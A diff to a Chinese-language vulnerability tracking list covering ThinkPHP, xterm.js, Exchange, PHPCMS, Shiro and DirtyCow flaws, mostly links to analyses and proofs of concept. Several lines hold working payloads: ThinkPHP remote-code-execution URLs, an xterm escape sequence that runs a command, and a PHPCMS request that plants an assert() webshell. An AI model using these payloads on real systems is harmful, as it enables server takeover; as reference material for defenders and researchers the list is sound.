@@ -9,6 +9,15 @@ share: true
 
 2018
 ---
+1. **【20190115】ThinkPHP 5.1~5.2 RCE漏洞**
+    - ThinkPHP 5.0.x-5.0.23、5.1.x、5.2.x 全版本远程代码执行漏洞分析 <http://blog.nsfocus.net/thinkphp-full-version-rce-vulnerability-analysis/>
+    - POC合集：<https://github.com/SkyBlueEternal/thinkphp-RCE-POC-Collection>
+
+1. **【20190110】xterm.js 命令执行漏洞CVE-2019-0542**
+    - POC：`echo -e "abcdef\x1bP+qfoo;\ntouch /tmp/foo;aa\n\x1b\n"`
+    - 在xterm终端下可逃逸并执行命令。利用场景：受害者执行curl http://xxx/xxx.txt，服务端返回的内容包含上述特殊字符，于是回显的数据逃逸了xterm的终端，并额外执行了命令。
+    
+
 1. **【20181221】Windows越权任意文件读取0day**
     - <https://thehackernews.com/2018/12/windows-zero-day-exploit.html>
     - <https://sandboxescaper.blogspot.com/2018/12/readfile-0day.html>
@@ -21,6 +30,8 @@ share: true
     - <https://mp.weixin.qq.com/s?__biz=MjM5OTEzMzQwMA==&mid=2651667456&idx=1&sn=746ee2b9aa2b02f6ff60ff906ec2939a>
     - 受影响版本包括：V5.0.*、V5.1.*
     - 修复的版本：V5.1.31、V5.0.23
+    - /public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=321
+    - /public/index.php?s=index/\think\view\driver\Php/display/%3E&content=aaa%3C?php%20phpinfo();?%3E
 
 1. **【20181205】Kubernetes API特权提升漏洞CVE-2018-1002105**
     - <https://github.com/kubernetes/kubernetes/issues/71411>
@@ -29,6 +40,14 @@ share: true
     - 描述：发恶意包：`/type.php?template=tag_(){};@unlink(FILE);assert($_POST[1]);{//../rss`Shell落在这个文件：`/cache_template/rss.tpl.php` 内容：`"@unlink(FILE);assert($_POST[1]);"`
     - <http://www.yncert.org.cn/article/show/8119.html>
     - <https://github.com/ab1gale/phpcms-2008-CVE-2018-19127>
+
+1. **【20181113】严重，Exchange Server账号冒用，盗用任意用户邮件CVE-2018-8581**
+    - <https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2018-8581>
+    - POC：<https://github.com/thezdi/PoC/tree/master/CVE-2018-8581>
+    - POC：<https://github.com/WyAtu/CVE-2018-8581>
+    - 分析CVE-2018-8581：在Microsoft Exchange上冒充用户 <https://www.anquanke.com/post/id/168337>
+    - 分析CVE-2018-8581：<https://xz.aliyun.com/t/3670>
+    - 新的攻击手法，可以拿域控：<https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/>
 
 1. **【20181106】GOGS/Gitea任意代码执行(CVE-2018-18925/6)及利用流程**
     - 漏洞分析：<https://xz.aliyun.com/t/3168> <https://www.anquanke.com/post/id/163575>
@@ -53,7 +72,6 @@ share: true
         2017-06-13 FileUpload 1.3.3 发布
         2017-06-20 Struts 2.5.12 将内置commons-fileupload组件更新到1.3.3
         
-
 1. **【20181019】Oracle Weblogic远程代码执行漏洞CVE-2018-3191**
     - 描述：这个漏洞利用的gadget是weblogic中自带的，跟JDK版本无关，所以只要系统能连外网，未禁止T3协议，漏洞就可以利用，威力巨大。
     - 漏洞分析：<https://www.anquanke.com/post/id/162274>
@@ -522,8 +540,12 @@ https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0
 
 2016
 ---
+1. **【201610】DirtyCow脏牛提权漏洞CVE-2016-5195**
+    - 影响范围：Linux 内核 >=2.6.22（2007 年发行）开始就受影响了，直到 2016 年 10 月 18 日才修复。
+    - PoC: <https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs>
 
-1. **【20160810】Shiro 1.2.4反序列化命令执行漏洞**
+
+1. **【20160718】Shiro 1.2.4反序列化命令执行漏洞**
     - 描述：Cookie中rememberMe字段使用硬编码的AES加密，并且会被反序列化。所以可以被篡改为反序列化Gadget进行命令执行。
     - 漏洞利用：需要根据目标的环境选择相应的Gadget，目标环境如有`"commons-collections4:4.0"`的漏洞类库，则可以用ysoserial的`CommonsCollections2` payload直接打。但是如果目标环境是`"commons-collections:3.1、3.2.1"`类库的话，必须用JRMPClient中转一下，攻击者服务器监听JRMPListener再用`CommonsCollection6`等payload打。
     - 利用分析：对于commons-collections3.2.1环境，如果直接打commonscollection的payload，会报错
@@ -536,7 +558,3 @@ https://github.com/rapid7/metasploit-framework/blob/22503209d9b8aa0a0e21ed60d9a0
     - 漏洞分析：利用JRMPListener执行 <http://www.yilan.io/article/5b4dce6512d8c64b05ffd540>
     - 官方issue：<https://issues.apache.org/jira/browse/SHIRO-550>
     - 漏洞延伸：<https://mp.weixin.qq.com/s/NRx-rDBEFEbZYrfnRw2iDw>
-
-1. **【201610】DirtyCow脏牛提权漏洞CVE-2016-5195**
-    - 影响范围：Linux 内核 >=2.6.22（2007 年发行）开始就受影响了，直到 2016 年 10 月 18 日才修复。
-    - PoC: <https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs>
